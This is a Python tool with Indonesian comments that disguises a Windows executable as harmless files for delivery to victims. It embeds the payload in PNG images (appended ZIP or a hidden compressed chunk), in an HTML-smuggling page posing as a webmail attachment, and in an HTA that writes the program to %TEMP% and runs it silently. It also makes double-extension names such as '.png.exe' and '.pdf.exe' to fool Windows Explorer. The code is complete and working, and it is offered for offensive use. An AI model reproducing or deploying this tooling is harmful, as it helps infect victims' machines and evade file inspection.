"""tools/carrier.py â€” bungkus payload jadi file yang kelihatan bukan program.

Empat jalur, dipilih lewat --mode:

  zip    <nama>.png       PNG sah + ZIP di belakang IEND. 7-Zip atau Windows
                          Explorer bisa membukanya sebagai arsip, tapi viewer
                          gambar biasa berhenti di IEND dan cuma lihat foto.
  chunk  <nama>.png       PNG sah, NOL byte di belakang IEND. Payload disimpan
                          di ancillary chunk privat, jadi file ini menurut
                          spec PNG memang gambar utuh. zlib dulu, jadi
                          signature PE nggak muncul mentah.
  html   index.html       Halaman HTML sah. Base64 payload ada di dalamnya,
                          dirakit jadi Blob lalu jadi file lewat tombol
                          download. Browser modern nggak (dan nggak akan)
                          mengeksekusi exe dari halaman â€” jadi ini butuh satu
                          klik dari korban.
  hta    index.html.hta   HTML + JScript lewat mshta.exe. Ini yang benar-benar
                          mengeksekusi: decode base64, tulis exe ke %TEMP%,
                          jalankan, tutup jendela. Explorer menampilkan
                          namanya "index.html" kalau ekstensi disembunyikan.

Yang tidak mungkin dan sebaiknya jangan dijanjikan: .html murni yang
menjalankan exe tanpa klik. Itu bukan trik, itu 0day browser. Yang ada
cuma HTA (mshta) dan HTML smuggling (klik â†’ file jatuh, korban jalankan).

Pakai:
    python tools/carrier.py --exe dist\\SysUpdate.exe --out dist --mode all
    python tools/carrier.py --exe dist\\SysUpdate.exe --out dist --mode chunk
    python tools/carrier.py --exe dist\\SysUpdate.exe --image foto.jpg --mode html
"""

import argparse
import base64
import binascii
import os
import random
import shutil
import struct
import sys
import zipfile
import zlib

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Ancillary chunk privat: huruf pertama kecil = bukan chunk kritis, jadi
# decoder yang nggak kenal wajib mengabaikannya, bukan error.
CHUNK_ID = b"raTd"
PNG_SIG = b"\x89PNG\r\n\x1a\n"


def make_photo(dest, size=(1200, 800), seed=0):
    """Bikin gambar yang masuk akal sebagai foto, bukan kotak warna solid."""
    from PIL import Image, ImageDraw, ImageFilter

    rnd = random.Random(seed or random.randrange(1 << 30))
    w, h = size
    img = Image.new("RGB", (w, h))
    d = ImageDraw.Draw(img)

    top = (28, 42, 74)
    mid = (188, 116, 84)
    for y in range(h):
        t = y / float(h)
        if t < 0.62:
            k = t / 0.62
            c = tuple(int(top[i] + (mid[i] - top[i]) * k) for i in range(3))
        else:
            k = (t - 0.62) / 0.38
            c = tuple(int(mid[i] * (1 - 0.55 * k)) for i in range(3))
        d.line([(0, y), (w, y)], fill=c)

    sx, sy, r = int(w * 0.68), int(h * 0.58), int(h * 0.055)
    halo = Image.new("RGB", (w, h), (0, 0, 0))
    hd = ImageDraw.Draw(halo)
    hd.ellipse([sx - r * 5, sy - r * 5, sx + r * 5, sy + r * 5], fill=(120, 70, 40))
    halo = halo.filter(ImageFilter.GaussianBlur(r * 1.6))
    img = Image.composite(Image.new("RGB", (w, h), (255, 210, 150)), img,
                          halo.convert("L").point(lambda v: min(255, v * 3)))
    d = ImageDraw.Draw(img)
    d.ellipse([sx - r, sy - r, sx + r, sy + r], fill=(255, 240, 205))

    for layer in range(3):
        base = h * (0.66 + 0.09 * layer)
        pts = [(0, h)]
        for x in range(0, w + 40, 40):
            pts.append((x, base + rnd.uniform(-h * 0.05, h * 0.05)
                        + (h * 0.03 * layer)))
        pts.append((w, h))
        shade = 40 - layer * 12
        d.polygon(pts, fill=(max(shade, 8), max(shade - 4, 6), max(shade + 10, 10)))

    px = img.load()
    for _ in range(w * h // 6):
        x, y = rnd.randrange(w), rnd.randrange(h)
        r0, g0, b0 = px[x, y]
        n = rnd.randint(-9, 9)
        px[x, y] = (max(0, min(255, r0 + n)), max(0, min(255, g0 + n)),
                    max(0, min(255, b0 + n)))

    img = img.filter(ImageFilter.GaussianBlur(0.4))
    img.save(dest, "PNG", optimize=True)
    return dest


def make_ico(png_path, ico_path):
    from PIL import Image
    img = Image.open(png_path).convert("RGBA")
    side = min(img.size)
    left = (img.width - side) // 2
    top = (img.height - side) // 2
    img = img.crop((left, top, left + side, top + side))
    img.save(ico_path, sizes=[(16, 16), (24, 24), (32, 32), (48, 48),
                              (64, 64), (128, 128), (256, 256)])
    return ico_path


# --------------------------------------------------------------- mode "zip"

def zip_inner(exe_path, zip_path, entry_name):
    """ZIP satu file, DEFLATE. Nama entri sengaja bukan nama asli exe.

    DEFLATE dipakai bukan cuma buat ukuran: header PE jadi nggak muncul
    sebagai byte mentah di dalam PNG.
    """
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.write(exe_path, entry_name)
    return zip_path


def wrap_in_png(png_path, exe_path, entry_name):
    """Tempel ZIP berisi exe di belakang IEND, offset central directory digeser."""
    from polyglot import _shift

    tmp_zip = png_path + ".tmp.zip"
    zip_inner(exe_path, tmp_zip, entry_name)
    img = open(png_path, "rb").read()
    blob = open(tmp_zip, "rb").read()
    data = _shift(bytearray(img + blob), len(img))
    with open(png_path, "wb") as fh:
        fh.write(data)
    os.remove(tmp_zip)
    return png_path


# ------------------------------------------------------------- mode "chunk"

def _chunk(name, payload):
    return (struct.pack(">I", len(payload)) + name + payload
            + struct.pack(">I", binascii.crc32(name + payload) & 0xFFFFFFFF))


def iter_chunks(data):
    """Yield (offset, length, name, payload_start, payload). Hanya validasi dasar."""
    if not data.startswith(PNG_SIG):
        raise ValueError("bukan PNG")
    off = len(PNG_SIG)
    while off + 8 <= len(data):
        length = struct.unpack_from(">I", data, off)[0]
        name = data[off + 4:off + 8]
        start = off + 8
        end = start + length
        if end > len(data):
            break
        yield off, length, name, start, data[start:end]
        off = end + 4
        if name == b"IEND":
            break


def embed_chunk(png_path, exe_path, chunk_id=CHUNK_ID):
    """Simpan payload di ancillary chunk, setelah IHDR.

    PNG nggak punya "ruang biner bebas" di dalam IDAT â€” isinya wajib
    zlib-decompress jadi baris scanline, kalau diisi byte lain gambar rusak.
    Yang benar adalah chunk sendiri: nama 4 huruf, panjang, payload, CRC32.
    Ancillary = huruf pertama kecil, decoder wajib mengabaikan yang nggak
    dikenal. Jadi file ini tetap PNG utuh, nol byte sisa setelah IEND.
    """
    data = open(png_path, "rb").read()
    raw = open(exe_path, "rb").read()
    payload = zlib.compress(raw, 6)  # bikin signature PE hilang dari pandangan

    # IHDR selalu chunk pertama: 8 sig + 4 len + 4 name + 13 data + 4 crc.
    insert_at = len(PNG_SIG) + 25
    if data[12:16] != b"IHDR":
        insert_at = len(PNG_SIG)
    out = data[:insert_at] + _chunk(chunk_id, payload) + data[insert_at:]
    with open(png_path, "wb") as fh:
        fh.write(out)
    return png_path, len(payload)


def extract_chunk(png_path, out_exe, chunk_id=CHUNK_ID):
    """Ambil balik payload dari chunk. Dipakai verify() dan tools/unpack.py."""
    data = open(png_path, "rb").read()
    for _, length, name, _, payload in iter_chunks(data):
        if name == chunk_id:
            blob = zlib.decompress(payload)
            with open(out_exe, "wb") as fh:
                fh.write(blob)
            return out_exe, length
    raise ValueError("chunk %r tidak ada" % chunk_id)


# -------------------------------------------------------------- mode "html"

HTML_TMPL = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Attachment</title>
<style>
  body{{margin:0;font:15px/1.5 -apple-system,Segoe UI,Roboto,sans-serif;
       background:#f4f5f7;color:#1f2328;display:flex;min-height:100vh;
       align-items:center;justify-content:center}}
  .card{{background:#fff;border:1px solid #d8dde3;border-radius:10px;
        padding:28px 30px;max-width:460px;box-shadow:0 6px 24px rgba(0,0,0,.06)}}
  h1{{font-size:17px;margin:0 0 6px}}
  p{{margin:0 0 18px;color:#59636e;font-size:13px}}
  button{{border:0;border-radius:7px;background:#1a7f37;color:#fff;
         padding:10px 18px;font-size:14px;cursor:pointer}}
  button:hover{{background:#15682c}}
  small{{display:block;margin-top:14px;color:#8a929b;font-size:11px}}
</style>
</head>
<body>
<div class="card">
  <h1>1 attachment</h1>
  <p>{name} &middot; {size}</p>
  <button id="b">Open</button>
  <small>Collected by webmail attachment service</small>
</div>
<script>
var B64 = "{b64}";
document.getElementById('b').onclick = function () {{
  var bin = atob(B64), n = bin.length, u8 = new Uint8Array(n);
  for (var i = 0; i < n; i++) u8[i] = bin.charCodeAt(i);
  var blob = new Blob([u8], {{type: 'application/octet-stream'}});
  var a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = '{name}';
  document.body.appendChild(a);
  a.click();
  setTimeout(function () {{ URL.revokeObjectURL(a.href); a.remove(); }}, 4000);
}};
</script>
</body>
</html>
"""

HTA_TMPL = """<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Attachment</title>
<hta:application id="app" border="none" caption="no" showintaskbar="no"
                 scroll="no" innerborder="no" contextmenu="no"
                 selection="no" maximizebutton="no" minimizebutton="no"
                 windowstate="normal" sysmenu="no"/>
<style>
  body{{margin:0;background:#f4f5f7;font:15px/1.5 'Segoe UI',sans-serif;
       color:#1f2328;display:flex;align-items:center;justify-content:center;
       height:100vh}}
  .card{{background:#fff;border:1px solid #d8dde3;border-radius:10px;
        padding:26px 30px;text-align:center;box-shadow:0 6px 24px rgba(0,0,0,.06)}}
  h1{{font-size:16px;margin:0 0 6px;font-weight:600}}
  p{{margin:0;color:#59636e;font-size:12px}}
</style>
</head>
<body>
<div class="card">
  <h1>Preparing attachment&hellip;</h1>
  <p>{name} &middot; {size}</p>
</div>
<script language="JScript">
// Payload dibaca dari file HTA itu sendiri, bukan dari string base64.
// Alasannya praktis: decode 14 MB lewat JScript char-per-char makan puluhan
// detik dan ratusan MB RAM, sementara indexOf/substring jalan native.
try {{
  var MARK = "<" + "!--PAYLOAD" + "-->";
  var u = String(document.URL || window.location.href || "");
  u = u.replace(/^file:\\/+?/i, "");
  try {{ u = decodeURIComponent(u); }} catch (e0) {{}}
  u = u.replace(/\\//g, "\\\\");
  if (/^\\\\[A-Za-z]:/.test(u)) {{ u = u.substring(1); }}
  var selfPath = u;
  var src = new ActiveXObject("ADODB.Stream");
  src.Type = 2;
  src.Charset = "iso-8859-1";
  src.Open();
  src.LoadFromFile(selfPath);
  var all = src.ReadText();
  src.Close();

  var cut = all.indexOf(MARK);
  if (cut < 0) throw new Error("marker tidak ketemu");

  var raw = all.substring(cut + MARK.length);
  var B64 = raw.replace(/[^A-Za-z0-9\\+\\/=]/g, "");

  // Decode base64 lewat MSXML (native, cepat) -> byte array -> stream biner.
  // JANGAN pakai ADODB dengan charset iso-8859-1 untuk data biner: ADODB
  // memetakan ke Windows-1252, dan byte 0x81/0x8D/0x8F/0x90/0x9D rusak.
  // Hash hasilnya beda, exe-nya nggak jalan.
  var bytes = null;
  var progs = ["MSXML2.DOMDocument.6.0", "MSXML2.DOMDocument.3.0",
               "Microsoft.XMLDOM"];
  for (var i = 0; i < progs.length && bytes === null; i++) {{
    try {{
      var xml = new ActiveXObject(progs[i]);
      var node = xml.createElement("b64");
      node.dataType = "bin.base64";
      node.text = B64;
      bytes = node.nodeTypedValue;
    }} catch (e1) {{ bytes = null; }}
  }}
  if (bytes === null) {{ throw new Error("decoder base64 tidak tersedia"); }}

  var tmp = new ActiveXObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%");
  var dest = tmp + "\\\\{name}";

  var out = new ActiveXObject("ADODB.Stream");
  out.Type = 1;
  out.Open();
  out.Write(bytes);
  out.SaveToFile(dest, 2);
  out.Close();

  new ActiveXObject("WScript.Shell").Run('"' + dest + '"', 0, false);
  window.close();
}} catch (err) {{
  try {{
    var log = new ActiveXObject("Scripting.FileSystemObject").OpenTextFile(
        new ActiveXObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
        + "\\\\hta_err.txt", 8, true);
    log.WriteLine(err.message);
    log.Close();
  }} catch (e2) {{}}
  window.close();
}}
</script>
<!--PAYLOAD-->
"""


def _b64_file(path):
    with open(path, "rb") as fh:
        return base64.b64encode(fh.read()).decode("ascii")


def build_html(exe_path, out_path, download_name, size_text):
    body = HTML_TMPL.format(name=download_name, size=size_text,
                            b64=_b64_file(exe_path))
    with open(out_path, "w", encoding="utf-8") as fh:
        fh.write(body)
    return out_path


def build_hta(exe_path, out_path, drop_name, size_text):
    """HTML + base64 payload di belakang marker, satu file.

    Base64, bukan byte mentah: jalur baca file sendiri lewat ADODB teks
    aman buat ASCII, dan decoder MSXML butuh base64. Byte mentah lewat
    charset apa pun di ADODB nggak byte-exact.
    """
    head = HTA_TMPL.format(name=drop_name, size=size_text).rstrip()
    with open(out_path, "wb") as fh:
        fh.write(head.encode("utf-8"))
        fh.write(base64.b64encode(open(exe_path, "rb").read()))
    return out_path


# ------------------------------------------------------------------ driver

def _human(n):
    return "%.1f MB" % (n / 1048576.0)


def build_carriers(exe_path, out_dir, image_path=None, name="photo",
                   size=(1200, 800), seed=0, mode="all", html_name="index.html"):
    os.makedirs(out_dir, exist_ok=True)
    res = {}
    size_text = _human(os.path.getsize(exe_path))
    base = os.path.splitext(os.path.basename(exe_path))[0]

    want_png = mode in ("zip", "chunk", "all")
    if want_png:
        bare = os.path.join(out_dir, "_bare.png")
        if image_path:
            shutil.copy2(image_path, bare)
        else:
            make_photo(bare, size, seed)
        res["ico"] = make_ico(bare, os.path.join(out_dir, name + ".ico"))

        if mode in ("zip", "all"):
            png = os.path.join(out_dir, name + ".png")
            shutil.copy2(bare, png)
            wrap_in_png(png, exe_path, os.path.basename(exe_path))
            res["png_zip"] = png

        if mode in ("chunk", "all"):
            png = os.path.join(out_dir, name + "_chunk.png")
            shutil.copy2(bare, png)
            embed_chunk(png, exe_path)
            res["png_chunk"] = png

        # Ekstensi ganda: Explorer default nyembunyiin .exe, jadi yang
        # kebaca di kolom nama cuma "<name>.png".
        doubled = os.path.join(out_dir, name + ".png.exe")
        shutil.copy2(exe_path, doubled)
        res["double"] = doubled
        os.remove(bare)

    if mode in ("html", "all"):
        res["html"] = build_html(exe_path, os.path.join(out_dir, html_name),
                                 base + ".pdf.exe", size_text)

    if mode in ("hta", "all"):
        res["hta"] = build_hta(exe_path,
                               os.path.join(out_dir, html_name + ".hta"),
                               base + ".exe", size_text)

    return res


def verify(exe_path, res):
    """Bukti, bukan klaim: baca ulang semua hasil dan bandingkan byte-nya."""
    from PIL import Image

    out = {}
    if "png_zip" in res:
        p = res["png_zip"]
        img = Image.open(p)
        img.load()
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            with zipfile.ZipFile(p) as zf:
                names = zf.namelist()
                zf.extract(names[0], tmp)
                got = os.path.join(tmp, names[0])
                same = (open(got, "rb").read() == open(exe_path, "rb").read())
        out["zip"] = {"png_ok": img.format == "PNG", "entry": names[0],
                      "identik": same, "bytes": os.path.getsize(p)}

    if "png_chunk" in res:
        p = res["png_chunk"]
        img = Image.open(p)
        img.load()
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            got = os.path.join(tmp, "x.bin")
            extract_chunk(p, got)
            same = open(got, "rb").read() == open(exe_path, "rb").read()
        data = open(p, "rb").read()
        # Byte setelah IEND: harus nol. Ini inti mode chunk.
        tail = data[data.rfind(b"IEND") + 8:]
        out["chunk"] = {"png_ok": img.format == "PNG", "identik": same,
                        "sisa_setelah_iend": len(tail), "bytes": len(data)}

    if "html" in res:
        text = open(res["html"], "r", encoding="utf-8", errors="ignore").read()
        out["html"] = {"bytes": os.path.getsize(res["html"]),
                       "ada_base64": "var B64 =" in text}

    if "hta" in res:
        data = open(res["hta"], "rb").read()
        marker = data.find(b"<!--PAYLOAD-->")
        tail = data[marker + len(b"<!--PAYLOAD-->"):] if marker >= 0 else b""
        got = b""
        try:
            got = base64.b64decode(tail, validate=False)
        except Exception:
            pass
        out["hta"] = {"bytes": len(data),
                      "ada_marker": marker >= 0,
                      "payload_identik": got == open(exe_path, "rb").read()}
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--exe", required=True)
    ap.add_argument("--out", default="dist")
    ap.add_argument("--image", default="", help="pakai gambar sendiri")
    ap.add_argument("--name", default="photo", help="nama file gambar")
    ap.add_argument("--html-name", default="index.html")
    ap.add_argument("--width", type=int, default=1200)
    ap.add_argument("--height", type=int, default=800)
    ap.add_argument("--seed", type=int, default=0)
    ap.add_argument("--mode", default="all",
                    choices=["zip", "chunk", "html", "hta", "all"])
    ap.add_argument("--no-verify", action="store_true")
    args = ap.parse_args()

    if not os.path.isfile(args.exe):
        print("[!] exe nggak ada: %s" % args.exe)
        return 1

    res = build_carriers(args.exe, args.out, args.image or None, args.name,
                         (args.width, args.height), args.seed, args.mode,
                         args.html_name)
    for k in ("ico", "png_zip", "png_chunk", "double", "html", "hta"):
        if k in res:
            print("[*] %-9s: %s (%.2f MB)"
                  % (k, res[k], os.path.getsize(res[k]) / 1048576.0))

    if args.no_verify:
        return 0

    v = verify(args.exe, res)
    ok = True
    if "zip" in v:
        z = v["zip"]
        print("[*] cek zip : png=%s entri=%s identik=%s bytes=%d"
              % (z["png_ok"], z["entry"], z["identik"], z["bytes"]))
        ok = ok and z["png_ok"] and z["identik"]
    if "chunk" in v:
        c = v["chunk"]
        print("[*] cek chnk: png=%s identik=%s sisa_setelah_iend=%d bytes=%d"
              % (c["png_ok"], c["identik"], c["sisa_setelah_iend"], c["bytes"]))
        ok = ok and c["png_ok"] and c["identik"] and c["sisa_setelah_iend"] == 0
    if "html" in v:
        print("[*] cek html: %.1f MB base64=%s"
              % (v["html"]["bytes"] / 1048576.0, v["html"]["ada_base64"]))
    if "hta" in v:
        h = v["hta"]
        print("[*] cek hta : %.1f MB marker=%s payload_identik=%s"
              % (h["bytes"] / 1048576.0, h["ada_marker"], h["payload_identik"]))
        ok = ok and h["ada_marker"] and h["payload_identik"]
    if not ok:
        print("[!] ada yang nggak cocok. Jangan distribusi.")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
